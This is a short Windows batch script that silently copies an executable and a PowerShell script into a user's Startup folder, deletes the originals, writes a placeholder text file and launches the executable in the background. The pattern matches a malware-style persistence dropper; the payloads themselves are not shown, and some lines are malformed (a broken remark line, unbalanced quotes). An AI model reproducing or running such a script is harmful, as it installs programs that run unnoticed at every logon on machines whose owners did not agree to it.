@echo off
@ Rem copy command is tend to give output of n files copied in the console to remove it we will get its output to nul

copy main.exe """C:\Users\akshi\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\main.exe" > nul
del main.exe
copy initial.ps1 """C:\Users\akshi\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\initial.ps1" > nul
del initial.ps1
cd "C:\Users\akshi\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"
echo "first line" > hello.txt
echo "second line" >> hello.txt
echo "third line" >> hello.txt
start /B main.exe